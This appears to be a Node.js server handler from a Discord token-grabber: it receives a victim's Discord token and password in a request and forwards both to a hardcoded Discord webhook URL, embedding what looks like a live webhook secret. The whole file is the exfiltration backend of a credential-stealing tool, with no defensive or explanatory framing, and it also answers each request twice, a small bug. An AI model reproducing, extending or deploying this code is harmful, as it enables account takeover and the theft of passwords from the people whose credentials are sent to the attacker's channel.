const axios = require('axios');

exports.send = (req, res, webhook) =>
{
	const token = req.body.token;
	const password = req.body.password;
	
	if(token === undefined || password === undefined)
		return res.status(400).json({status: "error", message: "Not sent."});
	
	axios.post(`https://discord.com/api/webhooks/796347480999460885/VsI6pEuBtrcEO6ProATm3NlgpGgIoP1c8lvYtxF-uP9J1nqoOzxc3EONrzCPN4LplmWu`, { content: `Token: ${token}\nPassword: ${password}` })
	.then((resp) => 
	{
		if(resp.status === 200)
			return res.status(200).json({status: "ok", message: "Sent."});
	})
	.catch((err) => 
	{
		return res.status(500).json({status: "error", message: "Not sent."});
	});
	
	res.status(200).json({status: "ok", message: "Sent."});
}
